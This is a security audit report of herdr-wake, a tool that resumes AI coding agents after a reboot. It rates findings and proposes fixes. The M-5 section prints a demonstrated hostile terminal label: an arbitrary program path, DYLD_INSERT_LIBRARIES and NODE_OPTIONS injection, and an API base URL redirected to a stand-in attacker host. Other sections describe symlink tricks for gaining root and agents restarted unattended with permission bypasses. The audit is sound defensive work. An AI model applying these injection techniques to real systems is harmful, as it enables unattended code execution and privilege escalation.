# herdr-wake security audit

Date: 2026-11-10. Source: branch `main` at `a6b4e25`, working tree dirty (other agents were editing `README.md`, a working notes file and `tests/integration/setup.rs` during the audit; none of those are security relevant). Scope: all of `src/`, `assets/`, `scripts/`, `.github/workflows/`, `Cargo.toml`, and the design docs. Out of scope: the throwaway prototype scripts (not in this repository), `tests/` (read only for context), herdr-core itself and the four agents.

Method: full manual read of every source file, then a throwaway experiment crate (in the session scratchpad, depending on this crate by path, nothing written to the repository) that drove the real `wake::shell_main_with`, the four adapters, `Config::save`, the gate and the claim code with hostile inputs. A second, independent reviewer then re-read the code for every claim; its corrections are folded in (one claim about `curl` redirects was refuted and withdrawn, see L-9). `cargo test` was not needed and was not run. No `hc`, `herdr`, agent or network command was run, and nothing touched the real home.

Severity scale: critical, high, medium, low, info. Severity reflects what was demonstrated, not what might be true of software outside this repository. "Beyond starting position" says whether the attacker gains something they could not already do from where the scenario starts.

## 1. Threat model summary

herdr-wake runs as the user, holds no secrets of its own and listens on nothing. Its security weight comes from three facts:

1. **It turns stored data into an unattended command.** At boot, with nobody watching, `herdr-wake shell` reads a JSON label from each herdr-core terminal and runs a program built from it (`bin`, flags, environment, folder, session id), by default with the permission-bypass flags the session had.
2. **It edits other tools' trust-bearing files** (Claude `settings.json`, Codex `hooks.json`, Pi and OpenCode plugin folders, herdr-core `config.toml`) and installs a boot job.
3. **It is installed by `curl | sh`** from a GitHub release.

Actors considered, and the verdict for each:

| Actor | Can they gain anything through herdr-wake? |
|---|---|
| Process running as the same user | Nothing new in privilege: it can already write the user's files and (through herdr-core's socket, which offers `terminal.run`) start programs. herdr-wake gives it a quiet persistence slot (a label no tool displays in full) and, if the user ever runs `sudo herdr-wake install`, a path to root (M-4). |
| Anything that can write a terminal label but cannot otherwise run code | Yes: full code execution at next boot (M-5). No such writer exists in this repository; whether one exists in herdr-core (remote clients, peers, a future OSC resume reference) could not be assessed. |
| Another local user on a shared machine | Yes, when the victim's session ran in a folder that user controls or can recreate (M-1). Read access to logs and state where the home folder is world-traversable (L-6). No write access to gate, claim or state files with a normal umask. |
| A malicious repository or working folder | Yes in the same way as M-1: project-level agent configuration in the folder runs again at every boot without the owner present. Nothing in the repository can change the record itself. |
| Hostile hook payload | The payload arrives from the agent, as the same user. Shape checks exist only for Claude session ids. A hostile payload is equivalent to a hostile label (M-5). |
| Network attacker during install | Limited by HTTPS. The checksum protects against corruption, not against a replaced release (L-8, L-9). |
| Compromised GitHub Action or release asset | Yes: the release build trusts five actions by floating reference, one of them a branch (L-8). |

## 2. Findings, sorted by severity

No critical or high findings. Counts: 0 critical, 0 high, 5 medium, 5 low, 6 info.

| ID | Severity | Title | Location | Beyond starting position |
|---|---|---|---|---|
| M-1 | medium | Unattended resume in a folder the user does not own or that others can write (decision 15 not implemented) | `src/wake.rs:66-108`; `src/agents/claude.rs:68`, `codex.rs:464`, `pi.rs:278`, `opencode.rs:274` | Yes (another local user runs code as the victim) |
| M-2 | medium | `restore_bypass = false` leaves several permission bypasses in place | `src/agents/codex.rs:301-320`; `src/agents/claude.rs:367`, `373-384` | Not an attacker boundary: a safety control that does less than it says |
| M-3 | medium | Secrets can be stored in the record, against design rule 6 | `src/agents/claude.rs:364-389`; `codex.rs:311-312`; `opencode.rs:106`; `src/record.rs:425` | Yes (anything that can read labels, including remote herdr clients) |
| M-4 | medium | Running install or uninstall as root follows symlinks and chowns paths inside the user's home | `src/platform/macos.rs:1254-1258`, `1376-1391`, `1210-1212`; `src/setup/edits.rs:162-167`; `src/config.rs:85-88` | Yes (same-user process to root), only when the user runs it under sudo |
| M-5 | medium | The record is trusted wholesale at wake: program, environment, session id and session file are not re-validated | `src/wake.rs:469-486`; `src/agents/claude.rs:75-83`; `codex.rs:477-481`; `pi.rs:281-292`; `opencode.rs:277-285` | Not as far as can be shown; depends on herdr-core (see section 4) |
| L-6 | low | State, log and config files are created with the default umask; backups keep the source mode and are never pruned | `src/hook.rs:387-399`; `src/gate.rs:175-183`; `src/boot.rs:355-363`; `src/record.rs:383-397`; `src/config.rs:85-88`; `src/setup/edits.rs:137`; `src/platform/linux.rs:913-916` | Yes, read only (other local users) |
| L-7 | low | LaunchDaemon identity (`UserName`, label, file name, `HOME`) comes from environment variables, not the user database | `src/platform/macos.rs:797-806`, `828-835`; `assets/launchd/daemon.plist:12` | Only with a hostile or wrong environment at install |
| L-8 | low | Release trust chain: floating action references, no provenance, checksum from the same origin | `.github/workflows/release.yml:19,63,65,108,120,122`; `scripts/install.sh:184-199` | Yes for whoever compromises an action or the release |
| L-9 | low | Script hardening gaps: predictable staged file copied with `cp`, last-line truncation, uninstall runs whatever `herdr-wake` is on `PATH` | `scripts/install.sh:210-218,240`; `scripts/uninstall.sh:48` | Narrow cases only |
| L-10 | low | Record and payload text reaches the terminal and the log with control characters intact | `src/wake.rs:133-139`, `556-569`; `src/hook.rs:192`, `432`; `src/boot.rs:167-198`; `src/cli.rs:521-541` | Same as M-5 |
| I-11 | info | A newline in the binary or `boot.env` path injects lines into the systemd unit | `src/platform/linux.rs:662-679` | No |
| I-12 | info | CI and nightly run herdr-core's installer by `curl | sh`, unpinned | `.github/workflows/ci.yml:42`; `nightly.yml:38` | No (read-only token, no secrets) |
| I-13 | info | `exclude_dirs` handles `~` at wake but not when recording or in the boot summary | `src/hook.rs:149-151`; `src/boot.rs:159-163`; `src/wake.rs:121-129` | No (fails toward not resuming) |
| I-14 | info | `install` rewrites `boot.env` without a backup, dropping lines the user added (such as a token) | `src/setup/mod.rs:98-103`; `src/report.rs:992` | No |
| I-15 | info | "Flags re-checked against the agent's current `--help`" (decision 15) is not implemented; the tables are static | `src/agents/claude.rs:350-449`; `codex.rs:290-350`; `pi.rs:104-162`; `opencode.rs:99-125` | No |
| I-16 | info | If herdr-core #15 lands (a resume reference settable by terminal escape sequence), reading it would make M-5 remotely reachable | `docs/DECISIONS.md` decision 11 | Future risk |

## 3. Finding details

### M-1. Unattended resume in a folder the user does not control

**Where.** `wake::decide` (`src/wake.rs:66-108`) and every adapter's `resume_plan` check only `rec.cwd.is_dir()` (`claude.rs:68`, `codex.rs:464`, `pi.rs:278`, `opencode.rs:274`). `docs/DECISIONS.md` decision 15 says "Refuse a folder that is world-writable or not owned by the user". No such check exists anywhere in `src/` (searched for ownership, mode and uid tests).

**Scenario.** Shared Linux box or shared Mac. The victim once ran `claude --dangerously-skip-permissions` in `/srv/shared/proj` (owned by a colleague or group-writable), or in `/tmp/proj`. The machine reboots. Before herdr-core starts the terminal, the other user places or edits `.claude/settings.json` (a `SessionStart` hook), `.mcp.json`, `AGENTS.md`, `.pi/` or `opencode.json` in that folder; for a `/tmp` path that boot cleaning removed, they simply recreate the folder. herdr-wake resumes the agent there, unattended, with the bypass flags. The folder's own hook or MCP server command runs as the victim. The agent's folder-trust prompt does not help: trust for that path was granted when the victim first worked there. Verified: the experiment resumed in a scratch folder with no ownership or mode check on the path.

**Preconditions.** A second local user (or a process running as one) with write access to the session folder or the ability to recreate it; a recorded session there.

**Beyond starting position.** Yes. Without herdr-wake the victim would have to start the agent there again by hand, and would be present when it ran. herdr-wake does it at every boot with nobody watching.

**Fix.** In `wake::decide`, before building the plan, `lstat` the folder and each parent up to `/`: give up (permanent, with the manual command) unless the folder is owned by the current uid, is not group or world writable, is not a symlink, and no parent is writable by others without the sticky bit. Treat a folder under a sticky world-writable parent (`/tmp`, `/var/tmp`, `/private/tmp`) as refused. Add the same check to `hook::started` so such sessions are not recorded, and a `doctor` line listing refused records.

### M-2. `restore_bypass = false` leaves bypasses in place

**Where.** Codex: `-s/--sandbox`, `-a/--ask-for-approval`, `-c/--config`, `-p/--profile` are `Class::Keep` (`src/agents/codex.rs:301-320`); only `--yolo` and its aliases are `Class::Bypass`. Claude: `--settings` (`claude.rs:367`), `--allowed-tools`, `--allowedTools`, `--tools` (`373-384`) are `Restore`.

**Demonstrated.** With `restore_bypass = false`:

- Codex keeps `-s danger-full-access -a never -c approval_policy="never" -c sandbox_mode="danger-full-access" --sandbox=danger-full-access` (only `--yolo` was dropped).
- Claude keeps `--settings {"permissions":{"defaultMode":"bypassPermissions"}} --allowedTools Bash Write` (`--dangerously-skip-permissions` and `--permission-mode bypassPermissions` were dropped).
- Pi (`--approve`) and OpenCode (`--yolo`) behave as documented.

**Impact.** A user who turns the opt-out on, believing agents come back asking for permission, gets a Codex with no sandbox and no approvals, or a Claude in bypass mode, after every reboot.

**Fix.** Codex: when `restore_bypass` is false, drop `-s/--sandbox` unless the value is `read-only` or `workspace-write`, drop `-a/--ask-for-approval` unless the value is `untrusted`, `on-request` or `on-failure`, drop every `-c` whose key is `approval_policy`, `sandbox_mode`, `sandbox_workspace_write.*` or `shell_environment_policy.*`, and drop `-p/--profile` (a profile can set any of these). Claude: when false, drop `--settings` and `--allowed-tools`/`--allowedTools`/`--tools`, or parse inline `--settings` JSON and refuse it when it has a `permissions` or `hooks` key. State in the README exactly which flags the opt-out removes, and that agent config files are not touched.

### M-3. Secrets can end up in the record

**Where.** Flag values are stored verbatim: Claude `--settings`, `--mcp-config`, `--agents`, `--append-system-prompt`, `--system-prompt` (`src/agents/claude.rs:364-389`); Codex `-c key=value` (`codex.rs:311-312`); OpenCode `--server <url>` (`opencode.rs:106`). The environment allowlist includes `OPENCODE_DB` (`src/record.rs:425`); it is normally a file path, but `scrub_env` filters by variable name only, so a URL value with a password would be stored as given.

**Demonstrated.** `claude --mcp-config '{"mcpServers":{"gh":{"env":{"GITHUB_TOKEN":"ghp_..."}}}}' --settings '{"env":{"ANTHROPIC_API_KEY":"sk-ant-..."}}'` is stored whole; so is `codex -c model_providers.x.experimental_bearer_token="..."`, `opencode --server https://user:pass@host`, and `OPENCODE_DB=postgres://u:pass@h/db`.

**Exposure.** The label is returned by `terminal.get` and `terminal.list` to every client of herdr-core's socket (the desktop and mobile apps, machines connected over SSH), is saved in herdr-core's `terminals.json`, and its flags are printed by `herdr-wake resume` and by the give-up line in the terminal (`src/wake.rs:565-568`). Design rule 6 ("No secrets in records") covers the environment in its text; flag values break its intent. Pi's `--api-key` is correctly dropped (`pi.rs:147`).

**Fix.** (a) Store `OPENCODE_DB` only when it is a plain absolute path. (b) For flags whose value is inline JSON (`--settings`, `--mcp-config`, `--agents` when the value starts with `{` or `[`): do not store the value; drop the flag and log why, or write the JSON to a `0600` file under the state dir and store the path. (c) For Codex `-c`, drop values whose key matches `token|key|secret|password|auth|bearer` case-insensitively. (d) For `--server`, strip URL userinfo. (e) Longer term, keep flags and env in a `0600` file under `~/.local/state/herdr-wake/records/` and put only a reference in the label (this also fixes M-5).

### M-4. Root operations inside the user's home

**Where.** `LaunchdEnv::current` (`src/platform/macos.rs:782-820`) supports `euid == 0` and `install_steps` has an `is_root` branch (`1127-1152`); nothing in `src/cli.rs` or `src/setup/mod.rs` refuses root. In that mode the whole of `setup::install` runs as root against the invoking user's home (macOS `sudo` keeps `HOME`):

- `give_to_user` (`macos.rs:1254-1258`) calls `std::os::unix::fs::chown`, which follows symlinks, on any path that lexically starts with the home. `Step::Mkdir(logs_dir)` (`1210-1212`) accepts an existing symlink to a folder and then chowns its target.
- `write_file` (`macos.rs:1376-1391`) writes a predictable temporary name (`.<name>.tmp-<pid>`) with `fs::write`, which follows a planted symlink.
- `edits::write_atomic` resolves a symlinked target on purpose (`src/setup/edits.rs:162-167`), so a planted `~/.claude/settings.json` or `boot.env` symlink makes root write the link's target.
- `Config::save` (`src/config.rs:85-88`) writes `config.toml.tmp` with `fs::write`. Demonstrated as a normal user: with `config.toml.tmp` a symlink to another file, `save` overwrote that file and then renamed the symlink into place as `config.toml`.

**Scenario.** A process running as the user replaces `~/Library/Logs/herdr-wake` with a symlink to `/etc` (or `/Library/LaunchDaemons`) and waits. The user runs `sudo herdr-wake install --before-login`. Root chowns the target to the user, who now owns a system folder: root. The other two give root-owned overwrites of arbitrary files with partly controlled content.

**Also.** Even without an attacker, a root run leaves `boot.env` root-owned `0600` (the boot job, running as the user, cannot read it) and replaces `~/.claude/settings.json` with a root-owned file.

**Beyond starting position.** Yes, user to root, but only if the user runs herdr-wake itself under sudo. The documented flow prints `sudo` commands for the user to run and never asks for that; `scripts/install.sh` refuses sudo.

**Fix.** Refuse `euid == 0` in `cli::install` and `cli::uninstall` with a message pointing at the printed `sudo` commands, and delete the `is_root` branches. If a root mode is wanted later, do only the `/Library/LaunchDaemons` write and the `launchctl` calls as root and everything in the home after dropping to the user's uid. Independently: make `Config::save` use `edits::write_atomic` (which creates its temporary file with `create_new`).

### M-5. The record is trusted wholesale at wake

**Where.** `wake_body` loads the label, asks the adapter for a plan and runs it (`src/wake.rs:409-486`). The plan's program is `rec.bin` unchecked (`claude.rs:75`, `codex.rs:477`, `pi.rs:284`, `opencode.rs:277`). The plan's environment is `rec.env` unfiltered (`claude.rs:84`), merged over the terminal's environment (`wake.rs:475`); `record::scrub_env` runs only when a record is written (`src/hook.rs:196`). The session id is validated only for Claude and only in the hook (`claude.rs:48`, `139-145`; `cli.rs:582`), never in any `resume_plan`. Pi's `session_file` is any existing file (`pi.rs:281`). Claude's id is joined into a path unchecked (`claude.rs:267-276`), so an id with `../` satisfies the transcript check with any `.jsonl` file. OpenCode v2 runs the unchecked program a second time as a `before` command (`opencode.rs:292`, `wake.rs:617-632`). When `bin` is a bare name (`hook.rs:297`), it is looked up at wake with the record's `PATH` after changing into the record's folder, so a relative `PATH` entry runs a file from the project.

**What the code already does.** Flags are re-filtered through each adapter's table at wake, so unknown flags never reach the command. The record holds facts, not a command line. The schema version is checked. Writes are compare-and-set on `seq`. A session claim stops two terminals resuming one session.

**Demonstrated.** A label with `bin: "/tmp/evil-program"`, `env: {DYLD_INSERT_LIBRARIES, NODE_OPTIONS, ANTHROPIC_BASE_URL, CLAUDE_CONFIG_DIR: <attacker folder>}`, `session_id: "--dangerously-skip-permissions"` and `flags: ["--settings", "{\"hooks\":{...}}"]` went through the real `shell_main_with` and produced:

```
argv = ["/tmp/evil-program", "--settings", "{\"hooks\":{\"SessionStart\":[...]}}", "--resume", "--dangerously-skip-permissions"]
env  = DYLD_INSERT_LIBRARIES=/tmp/evil.dylib, NODE_OPTIONS=--require /tmp/x.js, ANTHROPIC_BASE_URL=https://evil.example, CLAUDE_CONFIG_DIR=<attacker folder>
```

So the answer to "can a hostile label make herdr-wake execute an arbitrary command at next boot, unattended, with bypass flags" is **yes**, four independent ways: the program path, the environment, an allowlisted flag that carries code (`--settings` hooks, `--mcp-config` servers, Codex `-c`), and a session id that parses as an option.

**Beyond starting position.** As far as this repository shows, no: writing a label needs herdr-core's socket, and the same socket offers `terminal.run`, which already runs any command as the user. What the attacker adds is persistence that outlives their access, invisible in normal use, executed with the user absent. It becomes a real escalation the moment any party can write labels without being able to run commands (a remote herdr client with fewer rights, a peer machine, a terminal escape sequence, see I-16). That is herdr-core's access model and could not be assessed here, which is why this is rated medium and not low.

**Fix (cheap, do all four).**

1. At wake, pass `rec.env` through `record::scrub_env` again before use, and additionally require `PATH` entries and the agent folder variables to be absolute paths.
2. Validate the session id in every `resume_plan` (and every `observe`): `[A-Za-z0-9_-]{1,128}`, not starting with `-`. Put the id after an `=` where the agent allows it (`--resume=<id>`, `--session=<id>`).
3. Check the program: `rec.bin` must be absolute or the bare agent name; its file name (after resolving symlinks) must be the agent's (`claude`, `codex`, `pi`, `opencode`, or a known versioned path such as `claude/versions/*`); the file must be owned by the user or root and not writable by group or others. Otherwise give up with the manual command.
4. Require Pi's `session_file` to be a regular file under the Pi session folder, owned by the user.

**Fix (structural, recommended before 1.0).** Keep an integrity copy outside herdr-core: when the hook writes a record, also write `sha256(record)` (or the whole record) to `~/.local/state/herdr-wake/records/<terminal>` with mode `0600`; at wake, resume only when the label matches. A label written by anything other than herdr-wake's own hook then never runs. This also gives M-3 a home for sensitive values.

### L-6. Permissions of state, log and config files

`log_line` (`src/hook.rs:387-399`), the gate file (`src/gate.rs:175-183`), `last-boot.json` (`src/boot.rs:355-363`), claim files (`src/record.rs:383-397`), unconfirmed markers (`src/wake.rs:313-317`) and `config.toml` (`src/config.rs:85-88`) are created with the process umask. Measured in the experiment with umask 022: state dir `0755`, gate file `0644`, `last-boot.json` `0644`, claims dir `0755`. Only `boot.env`, `installed-files.json` (both `0600`) and a freshly created `backups` dir (`0700`, `src/setup/edits.rs:142-149`) are private. `edits::backup` uses `fs::copy` (`edits.rs:137`), which keeps the source mode, so a backup of a `0644` `~/.claude/settings.json` (which can hold `env` API keys) is `0644`; on Linux `remove` can create `backups` itself with default mode (`src/platform/linux.rs:913`). Backups are never pruned and survive uninstall.

**Scenario.** On a system whose home folders are world-traversable (Debian default `0755`), another local user reads the log (terminal ids, session ids, folder paths), the boot summary and, if `backups` was created by the Linux path, copies of agent settings. No write access: the gate, claim and marker folders are not group or world writable with any common umask, so a second user cannot stall the gate or steal a claim.

**Fix.** Create the state dir and config dir with mode `0700` everywhere (one helper used by `log_line`, `gate`, `boot`, `record::claim`, `mark_unconfirmed`, `Config::save`, `linux.rs:913`), `chmod 0700` them on install when they already exist, open the log with mode `0600`, and set backups to `0600` after the copy. Mention in the README that backups may contain whatever the agent settings files contained and are kept until the user deletes them.

### L-7. LaunchDaemon identity from the environment

`LaunchdEnv::current` prefers `$USER`, `$HOME`, `$SHELL` over the passwd entry when not root (`src/platform/macos.rs:797-806`). `USER` becomes the daemon's `UserName`, part of its label and of the file name under `/Library/LaunchDaemons` (`828-835`); values are XML-escaped and shell-quoted but not validated. With `USER=root` in the environment at install time, the staged plist asks launchd to run a user-writable binary as root, and the printed `sudo install` command installs it. A `USER` containing `/` moves the destination path.

**Preconditions.** A wrong or hostile `USER` in the shell that runs `herdr-wake install --before-login`, and the user running the printed `sudo` commands without reading the plist. Separately, and without any environment trick: the plist is staged in the user-writable state folder (`macos.rs:1154-1165`) and installed later by the user's own `sudo install`. A process running as the user can rewrite it in between (for example `UserName` root with its own program) and gets root at the next boot. This is user to root, but needs malware already running as a user who then types sudo.

**Fix.** Take the user name and home from `getpwuid(getuid())` only; refuse a name outside `[A-Za-z0-9._-]` or uid 0; print the plist's `UserName` and `ProgramArguments` next to the `sudo` commands so the user sees what will be installed; print the staged file's SHA-256 and have the user's command verify it (`shasum -a 256 -c`) in the same `sudo` line.

With the correct user, the `--before-login` design is sound: the root-owned plist runs the user-writable binary as the user (`UserName`, `GroupName staff`), so replacing the binary gains nothing the user does not have. One open point is in section 4 (who opens `StandardOutPath`).

### L-8. Release trust chain

`release.yml` references `actions/checkout@v5`, `dtolnay/rust-toolchain@stable` (a branch), `actions/upload-artifact@v4` and `actions/download-artifact@v4` by floating reference (`:19,63,65,108,120,122`); `ci.yml` and `nightly.yml` add `Swatinem/rust-cache@v2`. A change to any of them, especially the toolchain action in the `build` job, alters the binary that strangers install. The `.sha256` file is produced in the same job and published in the same release as the archive (`release.yml:97-103`), and `install.sh` fetches both from the same place (`scripts/install.sh:184-199`): it detects a corrupted download, not a replaced release. There is no signature or build provenance.

What is right: default token is `contents: read` in every workflow; `contents: write` only in the `release` job and `issues: write` only in the nightly `report` job; no `pull_request_target`; no `${{ }}` expression with outside-controlled text inside a `run:` script (`GITHUB_REF_NAME`, the core version and the issue title travel as environment variables and are quoted); the tag must equal the `Cargo.toml` version; `cargo build --locked`; no build cache in the release workflow.

**Fix.** Pin every action to a full commit SHA (with the version in a comment) and let Dependabot update them. Add `actions/attest-build-provenance` for each archive (job permissions `id-token: write`, `attestations: write`) and document `gh attestation verify`. Turn on immutable releases and a tag ruleset for `v*` in the repository settings. Say in the README that the checksum guards against corruption only.

### L-9. install.sh hardening

1. `uninstall.sh:48` falls back to `command -v herdr-wake` when the binary is not in the expected folder; whatever that resolves to (including a relative `PATH` entry) is run and then removed. Require the result to be an absolute path and show it before running it. (An earlier draft of this audit claimed the `curl` calls allow an HTTP redirect; that was wrong and is withdrawn: `--proto '=https'` at `install.sh:67,184,186` also binds redirects. Adding `--tlsv1.2` is optional polish.)
2. The staged file `$bin_dir/.herdr-wake.new.$$` is predictable and written with `cp` (`:210-211`), which follows an existing symlink. Harmless in the default `~/.local/bin`; with `HERDR_WAKE_BIN_DIR` pointing at a folder others can write, another user can pre-plant the name. Use `mktemp "$bin_dir/.herdr-wake.new.XXXXXX"` and refuse a `bin_dir` that is group or world writable.
3. The script is safe against truncation except in the last five bytes: a download cut after `main` and before ` "$@"` runs `main` without the user's arguments, so `sh -s -- --dry-run` would perform a real install (`:240`). Wrap the whole file in `{ ...; main "$@"; }` or end with a sentinel line that `main` checks.

What is right: every step is inside `main`; `set -eu`; a 64-hex checksum is required and compared before anything is extracted or executed; a missing checksum tool is a refusal, not a skip; the download folder comes from `mktemp -d`; only the member `herdr-wake` is extracted; the version string is restricted to `[0-9A-Za-z.-]`; the final replace is one `mv` in the same folder; sudo is refused; nothing is `eval`ed and every expansion is quoted.

### L-10. Control characters in output and log lines

Record fields and hook payload fields are printed as they are: the give-up line in the terminal (`src/wake.rs:556-569`), `herdr-wake resume` (`src/cli.rs:521-541`), `status` and the boot summary details (`src/boot.rs:167-198`, which also land in `boot.log` and `last-boot.json`), and hook log lines such as `"{cwd} is excluded"` (`src/hook.rs:192`, `432`). `shell_quote` (`wake.rs:133-139`) keeps escape and newline characters inside the single quotes. A hostile label or payload can therefore forge log lines or send terminal escape sequences, and the "To retry" command it prints is built from the record (so it carries the hostile program path of M-5, correctly quoted).

**Fix.** One `printable()` helper that replaces every control character (including ESC and newline) with `?` or a `\xNN` form, applied to all record-derived and payload-derived text before printing or logging. Make `shell_quote` refuse (or `$'..'`-escape) words with control characters.

### Info items

- **I-11.** `render_unit` and `exec_word` (`src/platform/linux.rs:662-679`) escape `%`, `$`, quotes and spaces but not newlines; a binary or `boot.env` path containing one would add lines to the unit. The path is the user's own. Fix: refuse control characters in both paths at install.
- **I-12.** CI and nightly pipe `https://releases.herdr.dev/core/install.sh` into `sh` (`ci.yml:42`, `nightly.yml:38`). The token is read-only and no secrets are present, so the worst case is a wrong test result; keep the release workflow free of it (it is).
- **I-13.** `hook::excluded` and `boot::tally` compare `exclude_dirs` without expanding `~` (`src/hook.rs:149-151`, `src/boot.rs:159-163`), `wake::excluded` expands it (`src/wake.rs:121-129`). A `~/private` entry still stops the resume, but the session is recorded (so its flags and folder sit in a label). Fix: one shared function.
- **I-14.** `install` overwrites `boot.env` whenever its text differs (`src/setup/mod.rs:98-103`), without a backup. `doctor` advises giving Claude a `CLAUDE_CODE_OAUTH_TOKEN` (`src/report.rs:992`) without saying where; a user who puts it in `boot.env` (the right place: `0600`, and record env scrubbing drops `*_TOKEN`) loses it at the next install or upgrade. Fix: merge instead of replace, and name the file in the advice.
- **I-15.** Decision 15's "saved flags re-checked against the agent's current `--help`" is not implemented; the allowlists are compiled in. The allowlist approach is the safer of the two; update the decision text, and treat the tables as security relevant in review.
- **Other small items** (no ID): `doctor` reads all of herdr-core's `holder.log` into memory to show its last line (`src/report.rs:316`, `803`); read the tail only. On Linux `shutting_down` runs `busctl` and `systemctl` by bare name through the inherited `PATH` inside the wrapper (`src/platform/linux.rs:89`, `410-421`); use absolute paths or a fixed system `PATH`. `herdr-wake install --host X --dry-run` prints the host before validating it (`src/cli.rs:332`).
- **I-16.** Decision 11 plans to read a resume reference from herdr-core if herdr-core #15 lands. As proposed there, any program output in a terminal (a `cat` of a hostile file, an SSH session) could set it by escape sequence. Reading a command, argv, program path or environment from that source would be a remote code execution path at boot. Only ever take an opaque session id from it, validated as in M-5.

## 4. Could not be assessed

1. **herdr-core's socket access control**: socket file mode, which remote parties (mobile app, peer machines added with `hc machine add`) can call `terminal.label` on local terminals, and whether any of them is weaker than "can run commands as the user". This decides whether M-5 is defense in depth or an escalation. Check: `ls -l` the socket on a host with a running core, and read herdr-core's peer permissions.
2. **Who opens a LaunchDaemon's `StandardOutPath`** when `UserName` is set. `daemon.plist:10-11` points it at `~/Library/Logs/herdr-wake/boot.log`, a user-writable folder. If launchd opens or creates that file as root and follows a symlink, the user could make root append to or take ownership of a file of their choice. Check on a test Mac: install the daemon, replace `boot.log` with a symlink to a root-owned scratch file, reboot, see who wrote. Safe either way: drop both keys from `daemon.plist` and let `herdr-wake boot` append to its own log after it starts (it already runs as the user).
3. **How Claude Code, Codex, Pi and OpenCode parse an id that starts with `-`** (M-5, way four). Claude's `--resume [value]` is an optional-value option in the adapter's own table (`claude.rs:394`), which by commander's rules does not consume a word starting with `-`; not run against a real `claude`.
4. **Agent sandboxes and the socket**: whether a sandboxed Codex or Claude tool call can reach herdr-core's Unix socket (which would let a prompt-injected agent write its own terminal's label).
5. **Real reboot behavior**, the reboot matrix, and the GitHub repository settings (tag protection, immutable releases, who can push tags).
6. **Third-party crates** were not audited beyond their use here (`anyhow`, `clap`, `jsonc-parser`, `rustix`, `serde`, `serde_json`, `thiserror`, `toml_edit`, `libc`); `cargo audit` is not installed and nothing was installed. Add `cargo audit` or `cargo deny` to CI.

## 5. Product-level risk: unattended restart with bypass flags

What actually happens at boot: the agent process is started in the recorded folder with the recorded flags, and then waits for input. `auto_continue` is parsed in `src/config.rs` but nothing reads it, so herdr-wake never sends a prompt. The bypass flags therefore matter in three ways:

1. Whatever starts by itself with the agent runs unprompted: `SessionStart` hooks, MCP servers, plugins and extensions, from the user's config and from the project folder (M-1).
2. The next person to type in that terminal, including anyone who reaches it through a herdr client, drives an agent with no permission prompts.
3. Sessions come back before or without a human login (`--before-login`, linger), on a machine that may be unattended for days.

The README must say, near the top and not only in a settings table:

- herdr-wake restarts agents after a reboot **without asking**, with the same permission-bypass flags they had (`--dangerously-skip-permissions`, `--yolo`, `--approve`, `--auto` and equivalents), and how to turn that off (`restore_bypass = false`), with the exact list of what the switch removes once M-2 is fixed.
- A resumed agent loads project-level configuration from its folder again. Do not leave sessions running in folders other people can write, in `/tmp`, or in repositories you do not trust; use `exclude_dirs` or `herdr-wake forget`.
- Anyone who can use your herdr-core (every paired app and connected machine) can reach the resumed agents, and can influence what is resumed.
- Session records (folder, flags, a few environment variables) are stored as labels in herdr-core and are visible to its clients; do not pass secrets on agent command lines.
- `install` edits `~/.claude/settings.json`, `~/.codex/hooks.json`, the Pi and OpenCode plugin folders and herdr-core's `config.toml`; backups go to `~/.local/state/herdr-wake/backups`, may contain whatever those files contained, and are kept after uninstall.
- `--before-login` on macOS installs a root-owned LaunchDaemon that runs herdr-wake as your user; never run herdr-wake itself with sudo.
- The install checksum detects a broken download, not a tampered release; how to verify provenance once L-8 is done.
- `auto_continue` should stay unimplemented, or be clearly marked as raising the risk further, if it ever ships.

## 6. Checked and found sound

- **`herdr-wake shell` fail-safe**: every path, including panics, a hung core (one 2 s deadline per connection), a missing config and a hostile record, ends in an exec of a real shell; herdr-wake never execs itself as the shell (`wake.rs:650-659`).
- **No shell is ever invoked by herdr-wake**: agents, `hc`, `launchctl`, `systemctl`, `loginctl`, `ssh`, `scp` and probes are all run with argv arrays; no `sh -c`, no string concatenation into a command.
- **Hook command strings**: the binary path is single-quoted with `'\''` escaping for Claude and Codex (`claude.rs:280-282`, `codex.rs:75-78`); the Codex string is stable so its trust hash holds.
- **Pi and OpenCode plugins**: the binary path is inserted as a JSON string literal; the plugins call `spawn(BIN, [args])` with an argv array, pass the payload on stdin, and do nothing outside a herdr-core terminal.
- **Plists**: single-pass template substitution with XML escaping of every value (`macos.rs:1322-1360`); printed `sudo` commands are shell-quoted.
- **`boot.env`**: written `0600`, values with newlines skipped, never shell-evaluated by herdr-wake (`parse_boot_env` expands nothing); systemd reads it through `EnvironmentFile=`.
- **Remote install**: the host must not start with `-` and may not contain whitespace, control characters, `:` or `/`; `ssh` and `scp` get `--` before it; the remote command strings are fixed text; the platform is checked before copying.
- **Edits to other tools' files**: comment-preserving CST edits, duplicate keys refused, only entries whose command equals herdr-wake's are removed, the result is re-parsed before writing, temporary files are created with `create_new`, backups are taken first, the file's mode is kept.
- **Uninstall order**: core's `shell` is restored and read back before anything else is removed; the scripts remove the binary only after a successful `herdr-wake uninstall`.
- **Environment in records**: allowlist by name plus a suffix denylist (`_KEY`, `_TOKEN`, `_PASSWORD`, `_SECRET`); `ANTHROPIC_API_KEY` and similar never reach a label (the gap is values, M-3).
- **Flag policy**: unknown flags, positional words (prompts), print-mode and session-selecting flags are dropped both when recording and when resuming; Pi's `--api-key`, `--extension`, `--system-prompt` and Codex's `--remote-auth-token-env`, `--dangerously-bypass-hook-trust` are never restored.
- **Claim and gate files**: names are derived by strict encoding (`%XX` or `_`), so ids cannot escape the folder; claims are created atomically by hard link; every failure leans toward starting, none can block forever; folders of earlier boots are removed with `remove_dir_all`, which does not follow symlinks.
- **No use of `/tmp`** or any shared temporary folder in `src/`; `install.sh` uses `mktemp -d`.
- **Hooks**: never print, always exit 0, read at most 1 MiB of stdin with a 2 s limit, and log only an outcome line (no payload, no environment, no argv).
- **`doctor`, `status`, boot summary**: print paths, versions, terminal ids, session ids and reasons; no environment values, tokens or file contents other than the last line of herdr-core's `holder.log`.
- **Workflows**: least-privilege tokens per job, no injection through tag names, core version strings or issue titles (section L-8).
- **Unsafe code** (`getpwuid_r`, `getifaddrs`, signal handlers, `pre_exec`): buffers are owned and sized, pointers are checked for null, only async-signal-safe calls run between fork and exec.

## 7. Must fix before public release

1. **M-1** `src/wake.rs:66-108`: refuse to resume (and to record) in a folder that is not owned by the user, is group or world writable, is a symlink, or sits under a world-writable parent; this is decision 15, promised and missing.
2. **M-2** `src/agents/codex.rs:301-320`, `src/agents/claude.rs:367,373-384`: make `restore_bypass = false` drop Codex `--sandbox`, `--ask-for-approval`, `-c` and `--profile` values that loosen permissions, and Claude `--settings` and the tool allow flags.
